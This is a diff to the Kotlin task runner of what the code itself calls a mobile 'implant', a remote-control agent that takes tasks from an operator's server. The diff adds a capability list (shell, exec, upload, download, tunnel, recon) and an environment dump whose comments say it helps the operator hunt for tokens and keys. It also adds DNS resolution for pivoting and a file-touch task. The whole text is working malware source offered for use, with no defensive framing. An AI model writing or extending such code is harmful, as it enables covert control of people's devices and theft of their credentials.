@@ -12,6 +12,22 @@ object TaskRunner {
     const val MAX_OUTPUT = 900 * 1024
 
     /**
+     * The task kinds this implant can run.
+     *
+     * The list travels in the handshake metadata: the server refuses to queue
+     * work an agent cannot do, so the operator learns what the phone is
+     * capable of before the task is sent instead of after it failed.
+     *
+     * Only the kinds the phone really runs are listed. A desktop-only arm
+     * that answers "unsupported" is not a capability.
+     */
+    val CAPABILITIES: List<String> = listOf(
+        "shell", "exec", "sysinfo", "recon", "ls", "download", "cat", "upload",
+        "tail", "hash", "ps", "sleep", "exit", "kill", "ping", "tunnel",
+        "triage", "find", "netinfo", "env", "resolve", "touch",
+    )
+
+    /**
      * The connection parameters a task may need.
      *
      * Most tasks do not need them, but the pivot callback cannot work
@@ -237,6 +253,15 @@ object TaskRunner {
                 args.field("content")?.text() ?: "",
             )
             "netinfo" -> Outcome(0, netInfo().toByteArray(), "")
+
+            // ---- network reach and the local environment ------------------
+            "env" -> environment(args.field("filter")?.text() ?: "")
+            "resolve" -> resolve(
+                args.field("host")?.text() ?: "",
+                args.field("port")?.long() ?: 0L,
+            )
+            "touch" -> touch(path)
+            "scan" -> unsupported("scan", "network scanning needs the desktop implant")
             "p2p" -> unsupported("p2p", "peer links need the desktop implant")
             "bof" -> unsupported("bof", "COFF modules are a Windows capability")
             "ext" -> unsupported("ext", "extensions are a Windows capability")
@@ -290,6 +315,73 @@ object TaskRunner {
     /** Report a capability this platform does not have. */
     private fun unsupported(kind: String, why: String): Outcome =
         Outcome(2, ByteArray(0), "unsupported on this platform: $kind ($why)")
+
+    /**
+     * The environment of the implant, sorted by name.
+     *
+     * The filter keeps the interesting variables in reach: "PATH", "TOKEN",
+     * "KEY" -- whatever the operator is hunting for.
+     */
+    private fun environment(filter: String): Outcome {
+        val needle = filter.lowercase()
+        val sb = StringBuilder()
+        var count = 0
+        System.getenv().toSortedMap().forEach { (key, value) ->
+            if (needle.isNotEmpty() && !key.lowercase().contains(needle)) return@forEach
+            sb.append(key).append('=').append(value).append('\n')
+            count += 1
+        }
+        return Outcome(0, sb.toString().toByteArray(), "").with("count", Upk.num(count.toLong()))
+    }
+
+    /**
+     * Resolve a name into the addresses it points at.
+     *
+     * The operator asks "where does this name live" before opening a
+     * connection to it, so the answer is the address list and nothing else.
+     */
+    private fun resolve(host: String, port: Long): Outcome {
+        if (host.isEmpty()) return Outcome(1, ByteArray(0), "resolve requires args.host")
+        return try {
+            val addresses = java.net.InetAddress.getAllByName(host)
+            if (addresses.isEmpty()) return Outcome(1, ByteArray(0), "resolve $host: no addresses")
+            val sb = StringBuilder()
+            addresses.forEach { address ->
+                sb.append(address.hostAddress)
+                if (port > 0) sb.append(':').append(port)
+                sb.append('\n')
+            }
+            Outcome(0, sb.toString().toByteArray(), "")
+                .with("count", Upk.num(addresses.size.toLong()))
+        } catch (t: Throwable) {
+            Outcome(1, ByteArray(0), "resolve $host: ${t.message}")
+        }
+    }
+
+    /**
+     * Create the file if it is missing and stamp it with the current time.
+     *
+     * The contract is the one of the POSIX `touch`: the file exists
+     * afterwards and its timestamps are "now".
+     */
+    private fun touch(path: String): Outcome {
+        if (path.isEmpty()) return Outcome(1, ByteArray(0), "touch requires args.path")
+        return try {
+            val file = File(path)
+            val existed = file.exists()
+            if (!existed && !file.createNewFile()) {
+                return Outcome(1, ByteArray(0), "touch $path: cannot create the file")
+            }
+            if (!file.setLastModified(System.currentTimeMillis())) {
+                return Outcome(1, ByteArray(0), "touch $path: cannot set the timestamp")
+            }
+            val verb = if (existed) "touched" else "created"
+            Outcome(0, "$verb $path (${file.length()} bytes)\n".toByteArray(), "")
+                .with("size", Upk.num(file.length()))
+        } catch (t: Throwable) {
+            Outcome(1, ByteArray(0), "touch $path: ${t.message}")
+        }
+    }
 
     /**
      * Read one chunk of a file, mirroring implant/rust/src/task.rs.
